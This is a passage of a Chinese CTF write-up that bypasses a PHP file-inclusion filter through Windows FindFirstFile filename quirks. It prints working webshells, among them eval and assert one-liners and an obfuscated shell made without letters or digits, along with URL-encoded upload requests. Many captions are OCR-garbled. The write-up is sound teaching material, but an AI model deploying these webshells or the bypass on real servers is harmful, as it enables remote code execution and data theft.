+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png" data-caption="计算机生成了可选文字: /u：表示i?kkunicode,LJTF一8的规则匹配如汉字的匹配" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png" alt="计算机生成了可选文字: /u：表示i?kkunicode,LJTF一8的规则匹配如汉字的匹配"></a></p>
+<p>应该是这样的,它会默认匹配 /r /n 属于一个字节,而汉字匹配的话是两个字节</p>
+<p>所以这样的话就是四个字节了 替换后就变成了四个hhhh</p>
+<p>再输入一个回车试下:</p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png" data-caption="img" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png" alt="img"></a></p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png" data-caption="img" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png" alt="img"></a></p>
+<p>假如一句话是 <!--?php eval(@$_REQUEST[a]);?--> 虽然添加了几个字符 但并不影响php代码的执行</p>
+<p>总结来说 就是让上传一个没有字母和数字的webshell</p>
+<p>3.分析get要过滤的点</p>
+<p>1)这个函数解析url中get参数</p>
+<p>explode(“&”, $_SERVER[‘QUERY_STRING’]);</p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png" data-caption="计算机生成了可选文字: GET/?get123HTP/1.1 Host:248 Accept:*/* 一e5一40bb一87a9一89b6d684sb1t．node3.buuoj.cn X-Requested-With: User-Agent：Mozill ttpRequest (WindowsNT1生0in64，x64）AppleWebKit/537. Referer:http://248f2d25915一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ Accept-Encoding:gz1P，defl Accept-Language:zh-CN，Zh，q=O.9 Connect10n:Close" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png" alt="计算机生成了可选文字: GET/?get123HTP/1.1 Host:248 Accept:*/* 一e5一40bb一87a9一89b6d684sb1t．node3.buuoj.cn X-Requested-With: User-Agent：Mozill ttpRequest (WindowsNT1生0in64，x64）AppleWebKit/537. Referer:http://248f2d25915一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ Accept-Encoding:gz1P，defl Accept-Language:zh-CN，Zh，q=O.9 Connect10n:Close"></a></p>
+<p>2)看过滤点:</p>
+<p>  $read_file = “./files/“ . $this->filename;</p>
+<p>​        $read_file_with_hardened_filter = “./files/“ . path_sanitizer($this->filename, true);</p>
+<p>​        if($read_file === $read_file_with_hardened_filter ||</p>
+<p>​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</p>
+<p>​          return [“msg” => “request blocked”, “type” => “error”];</p>
+<p>​        }</p>
+<p>首先看这个函数</p>
+<p>path_sanitizer($this->filename, true) </p>
+<p>–></p>
+<p>if($harden){</p>
+<p>​      $harden_filter = [“/“, “\“];</p>
+<p>​      foreach($harden_filter as $f){</p>
+<p>​        $dir = str_replace($f, “”, $dir);</p>
+<p>​      }</p>
+<p>​    }</p>
+<p>它将文件名中 /  \替换为空</p>
+<p>然后这个if判断为真的话不能包含文件</p>
+<p> if($read_file === $read_file_with_hardened_filter ||</p>
+<p>​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter))</p>
+<p>也就是说包含的文件名必须加 / 或 \  同时文件内容也是不一样的</p>
+<p>比如上传一个test  然后包含文件时是test\  ->  test不等于test\  并且 file_get_contents(‘test')不等于file_get_contents(‘test’)</p>
+<p>那么这个判断就可以绕过了</p>
+<p>现在测试一下</p>
+<p>![计算机生成了可选文字: POST/?puaaa TP/1.1 bl-旧0上cn x64）AppleWebKit/537.36 RemiCollet， 〈/table> 〈table) Kova Host:248t Accept:<em>/</em> 一s915一40bb一87a9一89b6d684sb1t．node3. X-Requested-With::dILHttpRequest User-Agent：瞓ozilla/5．0(WindowsNT1生0in64， Gecko)Come/83987．149Safari/537.36 (KHTML, 1让e Referer:http：//248t2d25一s915一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ Accept—Encoding:gZ1P，deflate Accept-Language:zh-CN，Zh，q=O.9 ConnectIon:I C0Se Content-Length：26 <a href="trclass:h">trclass:h</a><thcolspan= <tdclass-e“〉p〗Webs Magnusson,P11p01s0n， Nielsen,PeterCowburn, <tclclass-e>EventMa Brown</tclclass-e> 一“1encoded <tclclass <tdclass 〈/table> e>Network e>Windows Content—Ty-pe: filenameaaa appIcation/x onten 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Thisprogram1SfreeS0 theternE0theP〗Li distribution1nthe11 〈/p〉 (p)ThisprogramSdiStr 厦．WARRAMY;withoutev FORAPARTICULARPURPOSE 〈/p〉 〈p〉Iyoudidnotrece1v． aboutP〗licensing,PI 〈/p〉 〈/table> SucCeSS}](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png)</p>
+<p>再包含下</p>
+<p>![计算机生成了可选文字: GET/?getaaa\ Host:248t Accept:<em>/</em> bl-旧0上cn x64）AppleWebKit/537.36 RemiCollet， 〈/table> 〈table) FerencKovacs〈/tc 一e15一40bb一87a9一89b6d684sb1t．node3. X-Requested-With: User-Agent：瞓0zi11 ttpRequest (WindowsNT10in64， (KHTML, 1让e Gecko)Come/83987．49Safari/537.36 Referer:<a href="http://248f2d25-" target="_blank" rel="noopener">http://248f2d25-</a> 15一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ Accept—Encoding:gZ1P，defte Accept-Language:zh-CN，Zh，q ConnectIon:I C0Se Content-Length：2 “2“〉譽eb！ <a href="trclass:h">trclass:h</a><thcolspan= <tdclass-e“〉p〗WebsitesT Magnusson,P11p01s0n，Lukas Nielsen,PeterCowburn,Adam <tclclass-e>EventMaintal Brown〈/td>〈/tr> <tclclass <tdclass 〈/table> e>NetworkInfras e>WindowsInfras 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Thisprogram1Sfreesoftware theternE0theP〗Licensea distribution1nthe11e：LIC 〈/p〉 〈p〉Tsprogramsdistributed 厦．WARRAMY;withouteventhe FORAPARTICULARPURPOSE. 〈/p〉 〈p〉Iyoudidnotrece1veaCOI aboutp}〗licenslng,pleaseC0 〈/p〉 〈/table> SucCeSS}](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png)</tclclass-e></p>
+<p>可以发现  成功include  但是文件内容没有读取 </p>
+<p>@include(“./files/“ . $this->filename);  ->  ./files/test\  它包含的是这个文件</p>
+<p>而我们上传的文件是这样的:  ./files/test</p>
+<p>所以文件并不能读取</p>
+<p>4.windows  FindFirstFile利用</p>
+<!--?php
+
+for ($j=0; $j<256; $j++) {
+
+for ($i=0; $i<256; $i++) {
+
+$url = 'flag.p' . chr($j) . chr($i);
+
+$tmp = @file_get_contents($url);
+
+if (!empty($tmp)) echo chr($j) . chr($i) . " ";
+
+}
+
+}
+
+?-->
+
+
+
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png" data-caption="计算机生成了可选文字: 砂〈砂〈砂〈砂〈0〈0 hPhp" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png" alt="计算机生成了可选文字: 砂〈砂〈砂〈砂〈0〈0 hPhp"></a></p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image012.png" data-caption="计算机生成了可选文字: 在调试php解释器的过程中，我们将此“袢奇'的漏洞归结为一个Winapi函数FindFirstFile()所产生的结果 更好玩的是当跟踪函数调用栈的过程中我们发现字符、'被替 (http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx) 换成" ？"，字符℃被萏换成“，而符号（双引号）被萏成一个"．字符。这在2007年msdn公开的文档中被提及：" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image012.png" alt="计算机生成了可选文字: 在调试php解释器的过程中，我们将此“袢奇'的漏洞归结为一个Winapi函数FindFirstFile()所产生的结果 更好玩的是当跟踪函数调用栈的过程中我们发现字符、'被替 (http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx) 换成" ？"，字符℃被萏换成“，而符号（双引号）被萏成一个"．字符。这在2007年msdn公开的文档中被提及："></a></p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png" data-caption="计算机生成了可选文字: 3．当iB#FindFlrstFiIe()±ä时，'。" （双引号）被替换成' incli」de('shell"php'）；>include('shell.php')； EXMPLE：" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png" alt="计算机生成了可选文字: 3．当iB#FindFlrstFiIe()±ä时，'。" （双引号）被替换成' incli」de('shell"php'）；>include('shell.php')； EXMPLE："></a></p>
+<p>本地测试 </p>
+<p><a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png" data-caption="计算机生成了可选文字: success 0 E:\phpstudy\PHPTutorial\WWW\test\webshell\test7.php(test)_SublimeText巛 文亻牛旧编辑选陉查找视(Y)鉍转工冥田顶吕凹苜选顶（N）帮助（H） 0E\phpstudy\PHPTutorial\WWW\test\webshell 文亻牛编辑选陉（S）查找（l)视(V)鉍转（G） OPENFILES ×test2.php ×test3.php ×testl.php 0test6.php Xtest5.php ×test7.php ×app.php FOLDERS webshell 12 flag.php test2.php <?php f引、 ，test3.php× ，testl.php×est6.php for chr($j) 'flag．p' chr($i); $tmp=@file_get_contents($url)； if（lempty($tmp))echochr($j) chr($i) OPENFILES ×flag.php flag.php SuCCeSS 0 echofile_get_contents（'flag" php'）；" data-fancybox="images"><img src="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png" alt="计算机生成了可选文字: success 0 E:\phpstudy\PHPTutorial\WWW\test\webshell\test7.php(test)_SublimeText巛 文亻牛旧编辑选陉查找视(Y)鉍转工冥田顶吕凹苜选顶（N）帮助（H） 0E\phpstudy\PHPTutorial\WWW\test\webshell 文亻牛编辑选陉（S）查找（l)视(V)鉍转（G） OPENFILES ×test2.php ×test3.php ×testl.php 0test6.php Xtest5.php ×test7.php ×app.php FOLDERS webshell 12 flag.php test2.php <?php f引、 ，test3.php× ，testl.php×est6.php for chr($j) 'flag．p' chr($i); $tmp=@file_get_contents($url)； if（lempty($tmp))echochr($j) chr($i) OPENFILES ×flag.php flag.php SuCCeSS 0 echofile_get_contents（'flag" php'）；"></a></p>
+<p>本题环境是 windows</p>
+<p>所以我们可以上传 文件名为  “/test   绕过:</p>
+<p>$read_file = “./files/“ . $this->filename;   // ./files/./test</p>
+<p>$read_file_with_hardened_filter = “./files/“ . path_sanitizer($this->filename, true);  // ./files/.test</p>
+<p>@file_get_contents($read_file)  //实际获取内容</p>
+<p>@file_get_contents($read_file_with_hardened_filter)  // 文件不存在</p>
+<p>![计算机生成了可选文字: POST/?put&”/abcHTTP/I.1 Host:248t2d25一s915一40bb一87a9一89b6d684sb1t．node3. Accept:<em>/</em> X-Requested-With::dILHttpRequest User-Agent：Mozilla/5.0(WindowsNT1生0in64， Gecko)Come/83987．149Safari/537.36 bl-旧0上cn x64）AppleWebKit/537.36 (KHTML, 1让e Referer:http：//248t2d25一s915一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ RemiCollet， 〈/table> 〈table) <a href="trclass:h">trclass:h</a><thcolspan= <tdclass=e“〉p〗Websit Magnusson,P11p01s0n，Ll Nielsen,PeterCowburn,Ad， <tclclass-e>EventMain Brown</tclclass-e> Accept—Encoding:gZ1P，deflate Accept-Language:zh-CN，Zh，q=O.9 Connect10n:Close Content-Length：32 Content—Tne:appIcation/x “1encoded <tclclass <tdclass 〈/table> e>Network] e>Windows] filename= abcecontent= 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Thisprogram1Sfreesoftw， theternE0theP〗Licen distribution1nthe11e： 〈/p〉 〈p〉TsprogramsdistribL 厦．WARRAMY;withouteven FORAPARTICULARPURPOSE. 〈/p〉 〈p〉Iyoudidnotrece1ve aboutP〗licensing,pleas’ 〈/p〉 〈/table> int(l) SucCeSS}](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image015.png)</p>
+<p>![计算机生成了可选文字: GET/?get&”/abcHTTP/I.1 Host:248t2d25一s915一40bb一87a9一89b6d684sb1t．node3. Accept:<em>/</em> X-Requested-With::dILHttpRequest User-Agent：Mozilla/5.0(WindowsNT1生0in64， Gecko)Come/83987．149Safari/537.36 bl-旧0上cn x64）AppleWebKit/537.36 (KHTML, 1让e Referer:http：//248t2d25一s915一40bb一87a9一89b6d684sb1t．node3.buuoj.on/ Accept—Encoding:gZ1P，deflate Accept-Language:zh-CN，Zh，q=O.9 ConnectIon:I C0Se Content-Length：32 Content—Tne:appIcation/x filename:/abc&content= “1encoded RemiCollet，FerencKovacs〈/td>〈/tr> 〈/table> 〈table) <a href="trclass:h">trclass:h</a><thcolspan= 2>WebsitesandInfrastru <tdclass:e“〉P〗WebsitesTeam<tclclass- Magnusson,P11p01s0n，LukasKahweSmith,Pier: Nielsen,PeterCowburn,AdamHarvey,FerencKova• <tclclass-e>EventMaintainers<tclclass Brown〈/td>〈/tr> <tclclass-e>NetworkInfrastructure<tdc <tdclass-e>WindowsInfrastructure<tdc 〈/table> 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Thisprogram1Sfreesoftware,youcanredistrib theternE0theP〗Licenseaspublishedbythe distributioninthe11e：LICENSE 〈/p〉 〈p〉Tsprogramsdistributedinthehopethat 厦，WARRAMY;withouteventhe》liedwarranty FORAPARTICULARPURPOSE. 〈/p〉 〈p〉Iyoudidnotrece1veaCOPY0theP》licer aboutp}〗licenslng,pleaseContaCtlicense@php. 〈/p〉 〈/table> int（2） <em>Nope<strong>Nope</strong>Nope**Nope</em> SucCeSS}](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image016.png)</tdclass-e></tclclass-e></tclclass-e></p>
+<p>5.最后就是构造无数字字母的webshell</p>
+<!--?php readfile('flag.php');?-->
+
+<p>看P牛文章:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>在构造前先理解下自增运算符拿shell的原理</p>
+<!--?php
+
+$_=[];
+
+$_=@"$_"; // $_='Array';
+
+$_=$_['!'=='@']; // $_=$_[0];
+
+$___=$_; // A
+
+$__=$_; //$__=A
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__='S'
+
+$___.=$__; //  $___='AS'
+
+$___.=$__; //  $___='ASS'
+
+$__=$_;  // $__='A'
+
+$__++;$__++;$__++;$__++; // $__='E'
+
+$___.=$__; //$___='ASSE'
+
+$__=$_;  //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='R'
+
+$___.=$__;  //$___='ASSER'
+
+$__=$_;  //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='T'
+
+$___.=$__; //$___='ASSERT'
+
+
+
+$____='_';  //$____='_'
+
+$__=$_; //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='P'  
+
+$____.=$__; //$____='_P'
+
+$__=$_; //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='O'
+
+$____.=$__; //$____='_PO'
+
+$__=$_; //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='S'
+
+$____.=$__; //$____='_POS'
+
+$__=$_; //$__='A'
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='T'
+
+$____.=$__; ////$____='_POST'
+
+
+
+$_=$$____; //$_='$_POST'
+
+$___($_[_]); // ASSERT($_POST[_]);
+
+?-->
+
+
+
+<p>再构造readfile(‘flag.php’)</p>
+<!--?=$_=[];$_="$_";$_=$_[("!"=="!")+("!"=="!")+("!"=="!")];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?-->
+
+
+
+
+
+<p>然后记得url编码过去 + 在匹配中会认为是空格</p>
+<p>![计算机生成了可选文字: POST/?put&”/qqHTTP/I.1 Host:41adf81a一327t一4b91一85b8一bf812d41f3b1.node3. Content-Length：3253 Accept:<em>/</em> X-Requested-With: User-Agent：Mozilla/5.0(WindowsNT1生0in64， Gecko)Come/83987．149Safari/537.36 Content—Tne:appIcation/xform¯urlencoded bl-旧0上 x64）AppleWebKit/537.36 charset=UTF- RemiCollet， 〈/table> 〈table) FerencKovacs〈/td (KHTML, 1让e “2”>Webs <a href="trclass:h">trclass:h</a><thcolspan= <tdclass=e“〉p〗WebsitesT Magnusson,P11p01s0n，Lukas Nielsen,PeterCowburn,Adam <tclclass-e>EventMaintaln« Brown</tclclass-e> Origin:http：//41adf81a一327t一4b91一85b8一bf812d41f3bl.node3.buuoj.cn Referer:http：//41adf81a一327t一4b91一85b8一bf812d41f3bl.node3.buuoj.on/ Accept—Encoding:gZ1P，deflate Accept-Language:zh-CN，Zh，q=O.9 ConnectIon:I C0Se 一”/与q&content：％3C％Bf％3d％24％5f％3d％5b％％3b％24％5f％3d％22％24％5f％22％3b％24％5f％3d％24％5f％5 filename- b％28％22％21％22％3d％3d％22％21％22％29％2b％28％22％21％22％3d％3d％22％21％22％29％2b％28％22％21％22％3d％3d％22％ 21％22％29％Scl％3b％24％5f％5f％3d％24％5f％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b ％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3 b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％ 3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％5f％3d ％24％5f％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2 b％3b％24％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％ 24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％3d％24％5f％3b％24 ％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％2 4％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％3d％24％5f％5f％2e％24％5f％ 5f％5f％2e％24％5f％5f％5f％5f％2e％24％5f％5f％5f％5f％5f％2e％24％5f％5f％5f％5f％5f％5f％3b％24％5f％5f％5f％3d％24 ％5f％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3 b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％ 5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b ％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5 f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％ Sf％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f ％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％3d％24％5f％5 <tclclass <tdclass 〈/table> e>Network e>Windows Infrasl Infrasl 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Thisprogram1Sfreesoftware theternE0theP〗Licensea！ distribution1nthe11e：LIC 〈/p〉 〈p〉Tsprogramsdistributed 厦．WARRAMY;withouteventhe FORAPARTICULARPURPOSE. 〈/p〉 〈p〉Iyoudidnotrece1veaCOP aboutp}〗licenslng,pleaseCOI 〈/p〉 〈/table> 〈/div〉〈/body〉〈/1]tml〉№儿L SucCeSS}](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image017.png)</p>
+<p>然后包含</p>
+<p>![计算机生成了可选文字: GET/?get&”/qq HTTP/I.1 Host:41adf81a一327t一4b91一85b8一bf812d41f3b1.node3. Content¯Length． 3253 Accept:<em>/</em> X-Requested-With::dILHttpRequest User-Agent：Mozilla/5.0(WindowsNT1生0in64， Gecko)Come/83987．149Safari/537.36 Content—Tne:appIcation/xform¯urlencoded <tclclass-e>EventMaintainers<tclclass-v>Damien bl-旧0上 x64）AppleWebKit/537.36 charset=UTF- (KHTML, 1让e Brown</tclclass-v></tclclass-e> <tdclass-e>Network <tclclass-e>Windows 〈/table> 〈1]2〉P》License 〈table) ()rclass-v〉〈td〉 〈p〉 Infrastructure Infrastructure <tdclass <tdclass-v”>AI redistribute1ta Origin:http：//41adf81a一327t一4b91一85b8一bf812d41f3bl.node3.buuoj.cn Referer:http：//41adf81a一327t一4b91一85b8一bf812d41f3bl.node3.buuoj.on/ Accept—Encoding:gZ1P，deflate Accept-Language:zh-CN，Zh，q=O.9 ConnectIon:I C0Se filename:/CICI&content=％3C％Bf％3d％24％5f％3d％5b％％3b％24％5f％3d％22％24％5f％22％3b％24％5f％3d％24％5f％5 b％28％22％21％22％3d％3d％22％21％22％29％2b％28％22％21％22％3d％3d％22％21％22％29％2b％28％22％21％22％3d％3d％22％ 21％22％29％Scl％3b％24％5f％5f％3d％24％5f％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b ％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3 b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％ 3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％2b％2b％3b％24％5f％5f％5f％3d ％24％5f％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2 b％3b％24％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％ 24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％3d％24％5f％3b％24 ％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％2 4％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％3d％24％5f％5f％2e％24％5f％ 5f％5f％2e％24％5f％5f％5f％5f％2e％24％5f％5f％5f％5f％5f％2e％24％5f％5f％5f％5f％5f％5f％3b％24％5f％5f％5f％3d％24 ％5f％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3 b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％2b％2b％3b％24％ 5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b ％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5 f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％2b％2b％3b％24％ 5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f％5f％5f％3d％24％5f％3b％24％5f％5f％5f％5f％5f％2b％2b％3b％24％5f％5f％5f ％Sf％Sf％2b％2b％3b％24％Sf％Sf％Sf％Sf％Sf％2b％2b％3b％24％Sf％Sf％Sf％Sf％Sf％2b％2b％3b％24％Sf％Sf％3d％24％Sf％5 Thisprogram1Sfreesoftware,youcan theternE0theP〗LicenseaspublishedbytheP》Group distributioninthe11e：LICENSE 〈/p〉 〈p〉Tsprogramsdistributedinthehopethattwi11be 厦，WARRAMY;withouteventhe》liedwarranty0MERC FORAPARTICULARPURPOSE. 〈/p〉 〈p〉Iyoudidnotrece1veaCOPY0theP}〗license, aboutp}〗licenslng,<a href="mailto:pleaseContaCtlicense@php.net">pleaseContaCtlicense@php.net</a>． 〈/p〉 〈/table> int(l) orha Array<?php $flag flag{1ts15t45一e5ae一4758一9211一t917ab00ab1引 if(stripos($SE尺讹尺<a href="file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image018.png">，SCRIPT_NAME’过 false){ _fl ag．phpsuccessfull Yloaded. <em>Nope**Nope</em> SucCeSS}</a></tclclass-e></tdclass-e></p>
+<p>再补充下为什么文件后缀不是 php 可以执行 php代码  只要文件内容是php完整代码就能执行</p>
+<p>![计算机生成了可选文字: 192.168.0.103/test/webshell/test5.php?a=1<< awclfÉ* 漏洞仓库 python 免杀 PHPVersion5·6·27 ial\WWW\test\webshell\test5.php(test)_SublimeText巛 彗找视(Y)鉍转工冥田顶吕凹苜选顶（N）帮助（H） 1 2 3 4 5 6 7 8 9 test2.php×，test3.php×，testl.php×lag.php <?php $a=@$_POSTCa]; //echo$a; eval($a); in0]到p l\WWW\test\webshell\123-SublimeText(L℃ENSEUP.. (0)视(V)鉍转（G）工冥(T)顶目苜选顶（N）帮助（H） 1 <?phpphpinfo();？丬](file:///C:/Users/aleng/AppData/Local/Temp/msohtmlclip1/01/clip_image019.png)</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/CTF/1/">哈希长度扩展攻击</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://perthinking.com">1eng</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://perthinking.com/CTF/2/">http://perthinking.com/CTF/2/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://perthinking.com">1eng</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2020
+            <a href="http://perthinking.com">1eng</a> Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> |
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu" target="_blank" rel="noopener">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
